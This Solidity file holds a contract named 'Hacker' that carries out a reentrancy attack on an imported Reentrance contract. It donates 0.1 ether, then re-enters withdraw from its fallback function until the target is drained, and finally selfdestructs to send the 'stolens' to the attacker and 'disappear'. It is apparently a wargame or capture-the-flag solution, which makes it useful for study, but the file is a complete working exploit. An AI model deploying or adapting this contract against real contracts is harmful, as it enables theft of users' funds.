// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

import "./Reentrance.sol";

contract Hacker {
  address payable public hacker;

  Reentrance targetContract;

  event Start(address indexed _target, uint256 _balance);
  event Stop(address indexed _target, uint256 _balance);
  event Reenter(address indexed _target, uint256 _balance);

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() public {
    hacker = payable(msg.sender);
  }

  function attack(address _target) public payable onlyHacker {
    require(msg.value >= (0.1 ether), "Not enough ether to attack");
    targetContract = Reentrance(payable(_target));

    // 0. Donate with the address of hacker contract
    targetContract.donate{value: (0.1 ether)}(address(this));

    // 1. Withdraw the ether back to hacker contract
    emit Start(_target, address(this).balance);
    targetContract.withdraw(0.1 ether);
  }

  fallback() external payable {
    // 2. Check target balance, if no more ether, stop attack
    if (address(targetContract).balance < (0.1 ether)) {
      emit Stop(address(targetContract), address(this).balance);
      return;
    }

    // 3. Re-entrancy Attack
    emit Reenter(address(targetContract), address(this).balance);
    targetContract.withdraw(0.1 ether);
  }

  function kill() external onlyHacker {
    // 4. Get the stolens back to hacker account, and disappear
    selfdestruct(hacker);
  }
}
